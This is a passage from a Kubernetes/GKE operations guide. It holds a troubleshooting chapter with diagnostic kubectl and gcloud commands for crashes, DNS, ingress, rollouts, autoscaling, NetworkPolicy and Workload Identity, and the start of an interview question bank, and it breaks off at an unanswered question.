|---|---|---|
| `0` | Clean exit — but `restartPolicy: Always` restarts it anyway | Your entrypoint is exiting. Long-running process? |
| `1` | App error | Read the logs |
| `137` | **SIGKILL — almost always OOMKilled** | `describe pod` → `Reason: OOMKilled`. Raise `limits.memory`, or find the leak |
| `139` | SIGSEGV | Native crash |
| `143` | SIGTERM — terminated cleanly | Usually not a crash; something is deleting it |
| `126` | Command not executable | Bad `command`, wrong arch, missing +x |
| `127` | **Command not found** | Typo, or **you're on distroless and there's no shell** |
| `1` immediately with `runAsNonRoot` error | **`USER` in the Dockerfile is a string, not numeric** | Part 5 |

```bash
# Was it OOM?
kubectl get pod <pod> -n shopwave-prod -o jsonpath='{.status.containerStatuses[0].lastState.terminated.reason}'
# -> OOMKilled

# Memory headroom across the namespace
kubectl top pods -n shopwave-prod --sort-by=memory
```

> **OOMKilled but the app looks fine?** Check for a **`medium: Memory` emptyDir** — a tmpfs counts against the container's memory limit and doesn't appear in your heap (Part 7). Or a JVM/Redis/Elasticsearch that wasn't told its cgroup limit and sized itself from the node (Parts 7, 12).

> **CrashLoop right after a config change and the pod won't even start?** `CreateContainerConfigError` = a referenced ConfigMap/Secret key doesn't exist. `describe pod` names it.

## 18.4 `ImagePullBackOff` / `ErrImagePull`

```bash
kubectl describe pod <pod> -n shopwave-prod | grep -A10 Events
```

| Message | Cause |
|---|---|
| `manifest unknown` / `not found` | Typo in the tag, or the tag was cleaned up (Part 6 cleanup policy!) |
| `unauthorized` / `denied` | Node SA lacks `roles/artifactregistry.reader` (Part 6) |
| `dial tcp ... i/o timeout` | **Private Google Access is off** (Part 1) — the #1 private-cluster bug |
| `x509: certificate signed by unknown authority` | Corporate TLS-inspecting proxy |
| Pull works, then stops after a rollback | **The old image was garbage-collected** — your rollback is broken (Part 8) |
| Pull suddenly always required | Tag is `latest` → `imagePullPolicy` flipped to `Always` (Part 5) |

```bash
# Does the image actually exist?
gcloud artifacts docker images list $REGISTRY/catalog --include-tags

# Can the node's SA read it?
gcloud artifacts repositories get-iam-policy shopwave --location=$REGION
```

## 18.5 Service returns nothing / connection refused

```bash
# 1. Does the Service have ANY endpoints? This is 80% of it.
kubectl get endpointslices -n shopwave-prod -l kubernetes.io/service-name=catalog
kubectl get endpoints catalog -n shopwave-prod
```

**No endpoints** → one of exactly three things:

1. **The selector doesn't match any pod's labels.** Compare them character by character:
   ```bash
   kubectl get svc catalog -n shopwave-prod -o jsonpath='{.spec.selector}'
   kubectl get pods -n shopwave-prod --show-labels
   ```
2. **The pods exist but are not Ready.** Only Ready pods get into EndpointSlices.
   ```bash
   kubectl get pods -n shopwave-prod -l app.kubernetes.io/name=catalog
   # READY 0/1 -> readiness is failing. Why?
   kubectl describe pod <pod> -n shopwave-prod | grep -A5 Readiness
   ```
3. **`targetPort` doesn't match the container's port name/number.**

```bash
# 2. Can you reach the pod DIRECTLY? Bypasses the Service entirely.
kubectl run -n shopwave-prod curl --rm -it --image=curlimages/curl:8.8.0 --restart=Never -- \
  curl -sv http://<POD_IP>:8080/healthz

# 3. Can you reach the ClusterIP?
kubectl run -n shopwave-prod curl --rm -it --image=curlimages/curl:8.8.0 --restart=Never -- \
  curl -sv http://catalog:8080/healthz
```

> **Pod IP works, ClusterIP doesn't** → a Service/kube-proxy problem: check endpoints, check `targetPort`.
> **Neither works** → the app isn't listening, or it's bound to `127.0.0.1` instead of `0.0.0.0` (a classic — it works locally and never in a container).
> **Works from one pod but not another** → **NetworkPolicy** (Part 15).

## 18.6 DNS failures

```bash
kubectl run dns -n shopwave-prod --rm -it --image=busybox:1.36 --restart=Never -- sh
# inside:
nslookup catalog
nslookup catalog.shopwave-prod.svc.cluster.local
cat /etc/resolv.conf
```

| Symptom | Cause |
|---|---|
| **Everything fails, right after applying NetworkPolicy** | **You blocked DNS.** Apply `allow-dns-egress` (Part 15). **The #1 cause.** |
| Short name fails, FQDN works | `search` domain issue, or you're in a different namespace than you think |
| External names are slow | **`ndots:5`** — 8 queries per lookup (Part 9) |
| **Exactly 5.000-second** latency spikes | The **conntrack race** (Part 9). NodeLocal DNSCache or DPv2 |
| `nslookup` works, the app fails | The app is caching a stale negative result, or using a different resolver |
| Nothing resolves, `hostNetwork: true` | You need **`dnsPolicy: ClusterFirstWithHostNet`** |

```bash
# Is CoreDNS itself healthy?
kubectl get pods -n kube-system -l k8s-app=kube-dns
kubectl logs -n kube-system -l k8s-app=kube-dns --tail=50
kubectl top pods -n kube-system -l k8s-app=kube-dns    # is it CPU-saturated?
```

## 18.7 Ingress: 502 / 503 / backend UNHEALTHY

```bash
kubectl describe ingress shopwave -n shopwave-prod
gcloud compute backend-services list
gcloud compute backend-services get-health <backend> --global
```

**Work the five-item checklist from Part 10, in order:**

1. **Backend `UNHEALTHY`, pods are Ready** → **firewall for `35.191.0.0/16` + `130.211.0.0/22`.** #1 by a mile.
2. **Health check probes `/`, app returns 302/401** → BackendConfig pointing at `/readyz`. #2.
3. **Cert `FailedNotVisible`** → DNS isn't pointing at the LB IP.
4. **Random 502s under normal load** → backend keepalive < LB idle timeout. Set gunicorn `keepalive = 65` (Part 4).
5. **502s only during deploys** → the termination race. `preStop: sleep`, NEG readiness gates, `terminationGracePeriodSeconds` > preStop + drain (Parts 7, 9).

> **And: it's been 3 minutes and nothing works.** GCE Ingress takes **5–10 minutes** for the first provision. That's normal. `kubectl describe ingress` narrates each GCP object as it's created — read it rather than re-applying.

## 18.8 Rollout is stuck

```bash
kubectl rollout status deploy/catalog -n shopwave-prod
kubectl get rs -n shopwave-prod -l app.kubernetes.io/name=catalog
kubectl describe deploy catalog -n shopwave-prod | grep -A10 Conditions
```

| Symptom | Cause |
|---|---|
| One pod `Pending`, rollout frozen | **`maxUnavailable: 0` with no headroom** (Part 8) — no room for the surge pod |
| New pods Running but never Ready | Readiness is failing. `describe pod` → Readiness events |
| `ProgressDeadlineExceeded` | 5 min of no progress. **Kubernetes will NOT roll back for you** (Part 8) |
| Deployment shows 0/3, **no pods at all** | **ResourceQuota** → `kubectl describe rs` (Part 3) |
| Deployment 0/3, no pods, quota is fine | **PSA rejected the pod template** → `kubectl describe rs` (Part 3) |
| `rollout undo` produces `ImagePullBackOff` | The old image was GC'd from the registry (Part 8) |
| `rollout undo` does nothing | `revisionHistoryLimit: 0` — there's no old RS to scale up |
| Config changed but nothing happened | **Env-var ConfigMaps never update** (Part 11). `rollout restart` |

## 18.9 Node problems

```bash
kubectl describe node <node>
kubectl get nodes -o json | jq -r '.items[] | select(.status.conditions[] | select(.type=="Ready" and .status!="True")) | .metadata.name'
```

| Condition | Meaning | Effect |
|---|---|---|
| `MemoryPressure` | Node low on memory | `NoSchedule` taint; kubelet evicts **BestEffort first** (Part 3) |
| `DiskPressure` | Node low on disk / inodes | `NoSchedule`; kubelet **GCs images and evicts pods** |
| `PIDPressure` | Too many processes | Usually a zombie-reaping bug — PID 1 (Part 5) |
| `NetworkUnavailable` | CNI not ready | Nothing schedules |
| `Ready=Unknown` | **kubelet stopped renewing its Lease** | 40s → `unreachable:NoExecute` → 300s → eviction (Part 13) |

> **`DiskPressure` and the whole node goes bad.** Usually one pod writing logs to a **file** instead of stdout, filling the node's disk, and now the kubelet is evicting **innocent neighbours** and garbage-collecting images (so everything else gets `ImagePullBackOff` too). One pod's bad logging config takes out a node. That's why "log to stdout" is a hard rule (Part 7).

> **`PLEG is not healthy`** in kubelet logs = the Pod Lifecycle Event Generator can't keep up talking to the container runtime. Common causes: too many pods per node, or **expensive `exec` probes forking constantly** (Part 7).

## 18.10 Cluster won't scale down (the money bug)

```bash
kubectl get events -A --field-selector reason=ScaleDown
kubectl -n kube-system get configmap cluster-autoscaler-status -o yaml
```

Work the blocker list from Part 14, in order:

1. **`emptyDir`** on a pod — #1 by a wide margin. Annotate `safe-to-evict: "true"` if the data is disposable.
2. **PDB with 0 allowed disruptions** — `kubectl get pdb -A`.
3. **Bare pods** with no controller.
4. **`kube-system` pods** without a PDB.
5. **`safe-to-evict: "false"`** annotation.
6. Restrictive affinity that can't be satisfied elsewhere.

```bash
# Find the culprit pod on a node that won't die
kubectl get pods -A --field-selector spec.nodeName=<node> -o json | \
  jq -r '.items[] | select(.spec.volumes[]?.emptyDir) | "\(.metadata.namespace)/\(.metadata.name)"'
```

## 18.11 HPA does nothing

```bash
kubectl describe hpa frontend -n shopwave-prod
kubectl top pods -n shopwave-prod
```

| Symptom | Cause |
|---|---|
| `TARGETS: <unknown>/60%` | **The pod has no CPU request** (Part 14). Or metrics-server is down. Or the pod is <30s old |
| At `maxReplicas` and still struggling | You've hit the ceiling; or you're scaling on CPU while the bottleneck is I/O (Part 14) |
| Scales up but never down | `scaleDown.stabilizationWindowSeconds` too long; or the metric never actually drops |
| Flapping | Stabilisation window too short |
| Fighting with VPA | **HPA + VPA on the same metric = feedback loop** (Part 14) |
| Custom metric `<unknown>` | Adapter APIService isn't `Available`: `kubectl get apiservice v1beta1.custom.metrics.k8s.io` |
| HPA scales, pods stay Pending | It's not an HPA problem — go to 18.2 |

## 18.12 "It's slow" but CPU looks fine

> **This is the best troubleshooting story in the document.**

```bash
kubectl top pods -n shopwave-prod
# catalog-xyz  120m / 600m limit ... 20% CPU. "Looks fine."
```

But it isn't. Check throttling:

```promql
rate(container_cpu_cfs_throttled_seconds_total{namespace="shopwave-prod", pod=~"catalog.*"}[5m])
```

> **CFS throttling.** The kernel enforces `limits.cpu` over **100ms periods**. A `limits.cpu: 600m` container gets 60ms of CPU per 100ms window. An app that needs a **200ms burst** to serve a request gets throttled for 3 windows — adding ~200ms of latency — while its **5-minute average CPU is 20%** and every dashboard says it's idle.
>
> The tell: **p99 latency is terrible, p50 is fine, CPU utilisation is low, and `container_cpu_cfs_throttled_seconds_total` is climbing.**
>
> Fixes: raise `limits.cpu`, or **remove the CPU limit entirely** (controversial, but for latency-sensitive services with honest *requests*, many teams do exactly this — requests guarantee your share, limits only cap your burst), or go **Guaranteed QoS with CPU pinning** (Part 3) for the truly latency-critical ones like `payments`.

Other "slow but healthy" causes:

- **DNS `ndots:5`** — 8 queries per external call (Part 9)
- **The 5-second conntrack DNS race** — look for latency spikes of *exactly* 5.000s (Part 9)
- **Cross-zone traffic** — topology-aware routing disabled itself (Part 9)
- **Memory pressure → page cache eviction** — the DB is now reading from disk
- **A noisy neighbour** — a Burstable pod with `maxLimitRequestRatio` unset, eating the node (Part 3)

## 18.13 NetworkPolicy debugging

```bash
kubectl get netpol -n shopwave-prod
kubectl describe netpol payments -n shopwave-prod

# The deny log - Dataplane V2 (Part 15)
kubectl logs -n kube-system -l k8s-app=cilium --tail=200 | grep -i "policy-verdict.*DENIED"
```

Check in this order:

1. **Did you allow DNS?** (Part 15)
2. **Did you allow BOTH sides?** Egress on the client **and** ingress on the server.
3. **AND vs OR** — `kubectl get netpol X -o yaml` and **count the `-` characters** in the `from` list (Part 15).
4. **Is it the API server?** On GKE the master is not a pod — you need the master CIDR as an `ipBlock` (Part 15).
5. **Is it the LB health check?** With NEGs the LB is external — `ipBlock` for `35.191.0.0/16`, `130.211.0.0/22`.
6. **Peer-to-peer?** Redis/Elasticsearch replication needs a policy selecting itself on both sides.

```bash
# Prove it, both directions
kubectl exec -n shopwave-prod deploy/orders -- \
  python -c "import socket; socket.create_connection(('payments',8080),timeout=3); print('OK')"

kubectl exec -n shopwave-prod deploy/frontend -- \
  python -c "
import socket
try:
    socket.create_connection(('payments',8080), timeout=3); print('REACHED - policy broken')
except Exception as e: print(f'BLOCKED - correct: {e}')"
```

## 18.14 StatefulSet won't start

| Symptom | Cause |
|---|---|
| `postgres-0` Pending, `volume node affinity conflict` | `volumeBindingMode: Immediate` (Part 12) |
| Pod stuck `ContainerCreating` for minutes | **`fsGroup` recursive chown** on a big volume → `fsGroupChangePolicy: OnRootMismatch` (Part 12) |
| StatefulSet stuck at pod 0 forever | `OrderedReady` + pod 0 can't become Ready without peers → needs `Parallel` (Part 12) |
| Peers can't find each other during bootstrap | **`publishNotReadyAddresses: true`** missing on the headless Service (Part 9) |
| `Multi-Attach error for volume` | The old pod is still holding the RWO PD — the previous node hasn't released it. Wait for the 6-min force-detach, or verify the node is truly dead |
| Two pods writing the same volume | Someone `--force --grace-period=0`'d a StatefulSet pod (Part 7). **Split-brain.** |
| PVC won't expand | `allowVolumeExpansion: false` on the StorageClass; or you edited `volumeClaimTemplates` (which doesn't retro-apply) (Part 12) |

```bash
kubectl get pvc -n shopwave-prod
kubectl describe pvc data-postgres-0 -n shopwave-prod
kubectl get pv
gcloud compute disks list --filter="name~pvc"
```

## 18.15 Workload Identity / permissions

| Symptom | Cause |
|---|---|
| `403 Permission denied` from a GCP API | Missing one of the **two halves** of the WI binding (Part 3) |
| Metadata server returns the **node's** SA | `--workload-metadata=GKE_METADATA` isn't set on the pool (Part 2) |
| Worked in dev, fails in prod | Different namespace → the `workloadIdentityUser` member string is `PROJECT.svc.id.goog[NAMESPACE/KSA]` and **namespace is in it** |
| It "randomly" started working | Propagation. WI bindings take up to ~60s |
| RBAC denies, but the user is cluster-admin in GCP | **GCP IAM overrides RBAC** — `roles/container.admin` is effective cluster-admin (Part 3) |

```bash
kubectl exec -n shopwave-prod deploy/payments -- \
  curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"
# MUST print the GSA, not the node SA

gcloud iam service-accounts get-iam-policy \
  shopwave-payments@$PROJECT_ID.iam.gserviceaccount.com
```

## 18.16 Debugging a distroless container

There's no shell. Use **ephemeral containers** (Part 5):

```bash
kubectl debug -n shopwave-prod payments-7d4b-xyz \
  -it --image=busybox:1.36 --target=payments -- sh

# Inside: --target shares the PROCESS namespace, so:
ps aux                       # see the payments process
ls -la /proc/1/root/         # see ITS filesystem
cat /proc/1/environ | tr '\0' '\n'
netstat -tlnp
```

Debug a node:

```bash
kubectl debug node/<node> -it --image=ubuntu
# The node's filesystem is at /host
chroot /host
```

Copy a pod to poke at it without disturbing the original:

```bash
kubectl debug -n shopwave-prod payments-7d4b-xyz \
  --copy-to=payments-debug \
  --container=payments \
  --image=asia-south1-docker.pkg.dev/kubernetas-console/shopwave/payments:1.0.0 \
  --set-image=payments=busybox:1.36 \
  -it -- sh
```

> **`kubectl debug --copy-to`** clones the pod (same volumes, same env, same SA) but **is not part of the Service's endpoints** — so you can break it freely without affecting traffic. That's the answer to "how do you debug a production pod without taking it out of rotation?"

## 18.17 The "everything is broken" checklist

When the whole cluster looks dead:

```bash
# 1. Is the API server reachable?
kubectl cluster-info
kubectl get --raw /healthz
# Hanging? -> master authorized networks. Your IP changed. (Part 2)

# 2. Is the control plane mid-upgrade?
gcloud container clusters describe $CLUSTER --region=$REGION --format="value(status,statusMessage)"

# 3. Are admission webhooks failing?
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations
# A webhook with failurePolicy: Fail that can't be reached BLOCKS ALL object
# creation. On a private cluster: the master->node firewall on 8443/9443. (Part 1)

# 4. Is Binary Authorization blocking system pods?
kubectl get events -A --field-selector reason=FailedCreate | grep -i binauthz
# Forgot to whitelist gke.gcr.io/* -> the cluster cannot heal itself. (Part 6)

# 5. Is it DNS?
kubectl get pods -n kube-system -l k8s-app=kube-dns

# 6. Are the nodes actually there?
kubectl get nodes
gcloud compute instances list --filter="name~gke-$CLUSTER"
```

> **The two cluster-wide self-inflicted outages to know by name:**
> 1. **An admission webhook with `failurePolicy: Fail` that becomes unreachable.** Now nothing can be created — **including the pod that would fix the webhook.** On a private GKE cluster, the cause is usually the master→node firewall not opening the webhook's port (Part 1). This is a genuinely famous class of incident.
> 2. **Binary Authorization enforced without whitelisting `gke.gcr.io/*`.** GKE's own system pods are blocked, the cluster cannot recover, and the recovery action is also blocked. Hence: **DRYRUN first, always** (Part 6).

## 18.18 The commands worth having in muscle memory

```bash
# Everything about a workload, fast
kubectl get all -n shopwave-prod -l app.kubernetes.io/name=catalog

# What changed?
kubectl rollout history deploy/catalog -n shopwave-prod
kubectl get rs -n shopwave-prod -l app.kubernetes.io/name=catalog \
  --sort-by=.metadata.creationTimestamp

# Sorted events - the incident timeline
kubectl get events -A --sort-by=.lastTimestamp | tail -40

# Which pods on which nodes in which zones
kubectl get pods -n shopwave-prod -o custom-columns=\
'POD:.metadata.name,NODE:.spec.nodeName,STATUS:.status.phase,RESTARTS:.status.containerStatuses[0].restartCount'

# The gap between requests and reality
kubectl describe nodes | grep -A6 "Allocated resources"
kubectl top nodes
kubectl top pods -A --sort-by=cpu

# Can this identity do this thing?
kubectl auth can-i --list --as=system:serviceaccount:shopwave-prod:payments -n shopwave-prod

# What does the API server think this object IS?
kubectl get deploy catalog -n shopwave-prod -o yaml | \
  kubectl neat 2>/dev/null || kubectl get deploy catalog -n shopwave-prod -o yaml

# Explain any field, from the live server's schema
kubectl explain deployment.spec.strategy.rollingUpdate --recursive

# Watch a rollout as it happens
kubectl get pods -n shopwave-prod -w -l app.kubernetes.io/name=catalog
```


---

# Part 19 — Interview Question Bank

Answers are compressed. The depth is in the Parts referenced.

## 19.1 The ten questions that decide the interview

**1. Walk me through what happens from `kubectl apply -f deployment.yaml` to a running container.**

> `kubectl` → **authn** (OIDC/gke-gcloud-auth-plugin) → **authz** (RBAC, unioned with GCP IAM) → **mutating admission** (LimitRange injects defaults, webhooks) → **schema validation** → **validating admission** (ResourceQuota, PSA, Binary Authorization) → persisted to **etcd**. Then: the **Deployment controller** sees it and creates a **ReplicaSet**; the **ReplicaSet controller** creates **Pods** (no `nodeName`); the **scheduler** filters and scores nodes and **binds** by setting `spec.nodeName`; the **kubelet** on that node sees a pod with its name, calls the **CRI** to pull the image and create the sandbox (**pause container** → network/IPC/UTS namespaces), the **CNI** assigns an alias IP from the node's pod range, containers start; probes begin; on Ready, the **EndpointSlice controller** adds the pod IP, and **every** kube-proxy/Cilium programs its dataplane. *(Parts 3, 7, 8, 9, 13)*

**2. Your liveness probe checks the database. What's wrong with that?**

> A 30-second database blip makes the kubelet kill **every replica simultaneously**. They restart, the DB is still recovering, liveness fails again → `CrashLoopBackOff` across the fleet with exponential backoff to 5 minutes. **You turned a 30-second blip into a 20-minute outage with your own health check.** Liveness = "is my process wedged" (restart fixes it). Readiness = "should I get traffic" (restart doesn't fix it, and failing readiness lets you recover automatically when the DB returns). *(Part 7)*

**3. You get 502s on every deploy. Why?**

> The **termination race**. On pod deletion, two paths run **in parallel**: SIGTERM to the container (fast — one local kubelet) and endpoint removal (slow — API server → EndpointSlice controller → every node's kube-proxy → the GCLB's NEG deprogramming, seconds to tens of seconds). The container exits while the LB is still sending it traffic.
>
> Fix, both halves: a **`preStop: sleep 5-15`** that blocks SIGTERM while endpoints drain, **and** an app that fails readiness on SIGTERM then keeps serving in-flight requests before exiting. And `terminationGracePeriodSeconds` **>** preStop + drain, because the grace clock **starts before preStop**. On GKE, **NEG readiness gates** close the same race on the scale-up side. *(Parts 7, 9)*

**4. Deployment shows 0/3, and `kubectl get pods` returns nothing. Debug it.**

> **There are no pods**, so the failure is at the **ReplicaSet** level — admission is rejecting pod *creation*. Go up a level: `kubectl describe rs -l app=X`.
>
> Two causes: **ResourceQuota** (a namespace with a quota on `requests.cpu` **rejects** any pod without a CPU request — the fix is a **LimitRange**, which is a *mutating* controller and runs *before* the quota's *validating* check), or **Pod Security Admission** (PSA is enforced on the **pod**, not the Deployment, so the Deployment is accepted and pod creation fails). *(Part 3)*

**5. Sizing a GKE cluster: how big should the pod CIDR be?**

> Nodes = pod range ÷ per-node alias block. GKE allocates a fixed block per node sized by `max-pods-per-node`, rounded up to a power of two: 110 pods → `/24` (256 IPs), 64 → `/25`, 32 → `/26`. So `/14` = 262,144 ÷ 256 = **1,024 nodes**; a `/20` gives you **16**.
>
> **The pod secondary range is effectively immutable after cluster creation.** Get it wrong and your ceiling is permanent — the CA fails with `IP space exhausted` while your CPU quota looks fine, and there is no fix short of rebuilding. Size it enormous; private IPs are free. `max-pods-per-node` is the other lever: dropping 110→64 **doubles** your node ceiling from the same CIDR. *(Parts 1, 2)*

**6. How do you do a canary deployment in Kubernetes?**

> **Kubernetes has no canary primitive.** The replica-ratio hack (9 stable + 1 canary behind one Service = 10%) can't control *which* users, needs 10 pods for 10%, and has no automated analysis or rollback.
>
> Real canary needs **traffic weighting**: Gateway API `HTTPRoute` `backendRefs` with `weight`, which **decouples the traffic percentage from the replica count**; or Argo Rollouts / Flagger driving those weights from a **metric-analysis gate**. The cheapest partial answer that *is* native: **`minReadySeconds`** as a bake time, and `rollout pause` after the first new pod. *(Parts 8, 10)*

**7. Can you run HPA and VPA on the same workload?**

> **On the same metric, no — they form a feedback loop.** VPA raises `requests` → HPA utilisation is `usage/requests`, so utilisation **drops** → HPA scales **down** → the survivors get busier → VPA raises requests again. The workload oscillates.
>
> Legitimate: HPA on a **custom metric** (RPS, queue depth) + VPA on CPU/memory. Or GKE's **Multidimensional Pod Autoscaling** (HPA on CPU, VPA on memory only). The honest production answer: **VPA in `updateMode: "Off"` as a recommender**, feeding a quarterly right-sizing PR — because VPA's `Recreate` mode restarts your pods to resize them (there's no GA in-place resize). *(Part 14)*

**8. A PDB with `minAvailable: 3` on a 3-replica Deployment. What breaks?**

> That's `maxUnavailable: 0` in disguise, so: **every `kubectl drain` hangs forever**, **every node pool upgrade stalls** (GKE retries for ~1 hour then **force-deletes the pod anyway** — at a random moment with nobody watching, which is exactly what you were trying to prevent), and the **Cluster Autoscaler never removes that node**.
>
> And the deeper point: **PDBs only constrain voluntary disruptions** — drain, upgrade, CA scale-down, descheduler. They do **nothing** for node death, OOMKill, or a zone outage. A PDB doesn't make you available; **anti-affinity and topology spread** do. A PDB stops *your own maintenance* from taking you down. It's enforced by the API server on the `pods/eviction` subresource — which is why `kubectl delete pod` **bypasses it entirely**. *(Part 14)*

**9. How does Kubernetes detect a dead node, and why does failover take 5 minutes?**

> The kubelet renews a **Lease** in `kube-node-lease` every **10s**. The node-lifecycle-controller marks the node `Ready=Unknown` after **`node-monitor-grace-period` (40s)** without a renewal, then taints it **`node.kubernetes.io/unreachable:NoExecute`**. Every pod carries an **auto-injected toleration** for that taint with **`tolerationSeconds: 300`** (added by the `DefaultTolerationSeconds` admission plugin). So: **40s + 300s ≈ 5.5 minutes** before pods are evicted.
>
> Tune it by setting a shorter `tolerationSeconds` on the pod — the trade-off being that a 30-second network blip now evicts a whole node's workload. (Bonus: Leases replaced full NodeStatus writes precisely to stop node heartbeats hammering etcd.) *(Part 13)*

**10. You applied a default-deny NetworkPolicy and everything broke — but with DNS errors, not connection refused. Why?**

> You blocked **egress to CoreDNS in `kube-system`**. Every service call starts with a name lookup, so the symptom is `Name or service not known` and 5-second timeouts on *everything*, including services you explicitly allowed.
>
> Fix: an egress rule to `kube-system` / `k8s-app: kube-dns` on **UDP 53 and TCP 53** (TCP for >512-byte responses and NodeLocal DNSCache — allow only UDP and you get *intermittent* failures, which is worse). `kubernetes.io/metadata.name` is auto-labelled on every namespace so you can select it without extra work. *(Part 15)*

## 19.2 Rapid fire

**Deployment vs StatefulSet?**
> Not "does it have data" — **does the identity of an individual replica matter?** StatefulSet gives stable network identity (`postgres-0` forever), stable per-pod storage (`data-postgres-0`), and ordered lifecycle. Our `cart` has data (in Redis) and is a Deployment, because the data has an owner and it isn't the pod. *(Part 12)*

**`podManagementPolicy: OrderedReady` vs `Parallel`?**
> `OrderedReady` for primary/replica (the replica needs the primary to exist). `Parallel` for a symmetric quorum cluster — where `OrderedReady` **deadlocks**: node 0 can't be Ready until it forms a quorum, and peers aren't created until it's Ready. `Parallel` there is a **correctness requirement**, not an optimisation. *(Part 12)*

**Why did my pod get OOMKilled at 300Mi when the limit is 384Mi?**
> Check for an **`emptyDir` with `medium: Memory`** — a tmpfs is RAM and **counts against the container's memory limit**, but it's not in your heap so the app looks innocent. Or a runtime that wasn't told its cgroup limit (JVM sizing from node RAM, Redis `maxmemory` == limit so `BGSAVE`'s fork doubles it). *(Parts 7, 12)*

**Exit code 137?**
> 128 + 9 = SIGKILL. Almost always OOMKilled (`describe pod` → `Reason: OOMKilled`); occasionally a grace period expiring. 143 = 128 + 15 = SIGTERM. *(Part 7)*

**`kubectl exec` fails: `OCI runtime exec failed: exec: "sh": executable file not found`?**
> Distroless image — there is no shell. Use **ephemeral containers**: `kubectl debug <pod> -it --image=busybox --target=<container>`, which shares the process namespace so you can see `/proc/1/root/`. *(Parts 5, 18)*

**Why is my `runAsNonRoot: true` pod rejected when the image has `USER shopwave`?**
> `runAsNonRoot` **can't resolve a username** — the kubelet reads the image config and has no way to map a string to a UID without reading `/etc/passwd` inside the image, which it doesn't do. **`USER` must be numeric.** *(Part 5)*

**Why does `kubectl edit configmap` change nothing?**
> **Env-var ConfigMaps are injected once at container start and never update.** Volume-mounted ones **do** update (via an atomic `..data` symlink swap) — **except `subPath` mounts, which never update**. For env-vars: `kubectl rollout restart`, or better, a **checksum annotation** on the pod template so a config change *is* a spec change and rolls out with all your normal safety. *(Part 11)*

**What does `kubectl rollout restart` actually do?**
> Patches the pod template with a `kubectl.kubernetes.io/restartedAt` **annotation**. The template hash changes → a new ReplicaSet → a normal rolling update. There is no "restart" API. *(Part 8)*

**Are Secrets encrypted?**
> **No — base64-encoded.** Consequences: `get secrets` RBAC ≈ full credential access; an etcd backup is a credential dump. Mitigations: GKE **Application-layer Secrets Encryption** with Cloud KMS (envelope encryption, protects at rest and in backups — **not** against `kubectl get`), and better, **Secret Manager CSI**: nothing in etcd at all, Workload Identity auth, per-access Cloud Audit Logs, real rotation. *(Part 11)*

**How does Workload Identity work?**
> The pod asks the metadata endpoint for a token. The **GKE metadata server** (a DaemonSet, enabled by `--workload-metadata=GKE_METADATA`) intercepts it, fetches a **projected, audience-scoped, pod-UID-bound OIDC token** from the kubelet, exchanges it at **GCP STS** (which validates the signature against the cluster's public OIDC issuer and checks the `workloadIdentityUser` binding), then calls IAM Credentials `generateAccessToken` to impersonate the GSA. Returns a ~1h token. **Nothing durable touches disk.**
>
> **Both halves are required**: the `iam.gke.io/gcp-service-account` annotation on the KSA (K8s→GCP) and the `workloadIdentityUser` binding with member `PROJECT.svc.id.goog[NAMESPACE/KSA]` (GCP→K8s). *(Part 3)*

**Why must the node service account be least-privilege?**
> Without `GKE_METADATA`, **any pod** can `curl` the metadata endpoint and get the **node's** SA token. If that's the default Compute Engine SA — which has **`roles/editor` on the whole project** — then any pod RCE is a project takeover. A node needs exactly five roles: `logWriter`, `metricWriter`, `monitoring.viewer`, `resourceMetadata.writer`, `artifactregistry.reader`. *(Parts 2, 6)*

**iptables vs eBPF (Dataplane V2)?**
> `kube-proxy` in iptables mode traverses rules **sequentially** — 5,000 Services × 10 endpoints ≈ 100,000 rules per packet — and **any** Service change triggers a **full table rewrite**, so convergence is O(n) and can take seconds on a busy cluster (which is user-visible 5xx during rollouts). eBPF uses **kernel hash maps**: O(1) lookup, and an endpoint change updates **one entry**. Plus native NetworkPolicy and **policy deny-logging**. Trade-off: **immutable per cluster**, drops Calico CRDs, some semantic edge cases. *(Part 2)*

**Why `ndots:5` matters?**
> Names with <5 dots try the search domains first. `api.stripe.com` → 4 lookups × (A + AAAA in parallel) = **8 DNS queries** to resolve one external hostname. At scale: CoreDNS saturation, `i/o timeout`, mystery latency. Fixes: **trailing dot** (`api.stripe.com.`), lower `ndots` via `dnsConfig`, or **NodeLocal DNSCache**. *(Part 9)*

**What's the difference between `port`, `targetPort`, `nodePort`?**
> `port` = the Service's port. `targetPort` = the pod's port (use a **named** port so the Service doesn't couple to the container). `nodePort` = a port on **every** node. And: **LoadBalancer ⊃ NodePort ⊃ ClusterIP** — they're cumulative. *(Part 9)*

**Why do StatefulSet peers need `publishNotReadyAddresses: true`?**
> Bootstrap deadlock: peers need each other's DNS to **become** Ready, but a headless Service only publishes **Ready** addresses. Nobody's ready → no DNS → nobody becomes ready. *(Part 9)*

**Ingress backend is UNHEALTHY but the pods are Ready. Why?**
> **The firewall.** Google's LB health-check probers come from `35.191.0.0/16` and `130.211.0.0/22` and you must allow them explicitly. #1 GKE Ingress bug. #2: GCE's default health check probes `/` and expects 200 — if `/` returns 302, the backend is permanently unhealthy. Fix with a **BackendConfig** pointing at `/readyz`. *(Parts 1, 10)*

**Why is my cluster not scaling down?**
> Work the blocker list: **`emptyDir`** (#1 — annotate `cluster-autoscaler.kubernetes.io/safe-to-evict: "true"`), a PDB with 0 allowed disruptions, bare pods with no controller, `kube-system` pods without a PDB, `safe-to-evict: "false"`, restrictive affinity. One pod with a `/tmp` emptyDir keeps a whole VM alive. *(Part 14)*

**"It's slow but CPU is at 20%."**
> **CFS throttling.** The kernel enforces `limits.cpu` over **100ms periods**. A pod needing a 200ms burst gets throttled across three windows — 200ms of added latency — while its 5-minute average is 20%. Tell: p99 bad, p50 fine, CPU low, `container_cpu_cfs_throttled_seconds_total` climbing. Fix: raise the limit, remove the CPU limit (requests still guarantee your share), or Guaranteed QoS with CPU pinning. *(Parts 3, 16, 18)*

**How do you back up a Kubernetes cluster?**
> **You don't.** You back up what the cluster **can't recreate**: **PVs** (VolumeSnapshots / Backup for GKE with `--include-volume-data` and `--locked`) and **Secrets** (Secret Manager). Everything else is in **git** — the cluster is *reproducible*, not backed up. On GKE you can't touch etcd anyway. And: **an untested backup is a hope** — restore drills, quarterly, **timed**, because the number you need is a measured RTO. *(Part 17)*

**How do you upgrade a cluster safely?**
